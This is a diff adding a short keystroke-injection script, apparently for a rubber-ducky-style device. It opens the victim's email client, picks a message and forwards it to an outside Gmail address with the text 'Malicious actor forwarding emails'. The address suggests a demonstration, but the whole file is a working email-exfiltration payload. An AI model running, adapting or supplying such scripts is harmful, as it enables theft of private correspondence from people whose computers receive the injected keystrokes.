@@ -1,0 +1,27 @@
+REM Opens a email client
+DELAY 700
+REM EMAIL is equal to WINDOWS + E
+EMAIL_APP
+DELAY 2000
+DOWN
+DELAY 2000
+DOWN
+ENTER
+DELAY 2000
+REM Forward email with f
+FORWARD_EMAIL
+DELAY 2000
+REM Include forward email
+STRING demo1.blackfur@gmail.com
+DELAY 2000
+ENTER
+DELAY 2000
+ENTER
+DELAY 2000
+ENTER
+DELAY 2000
+REM Compose message
+STRING Malicious actor forwarding emails
+DELAY 2000
+SEND_EMAIL
+DELAY 2000
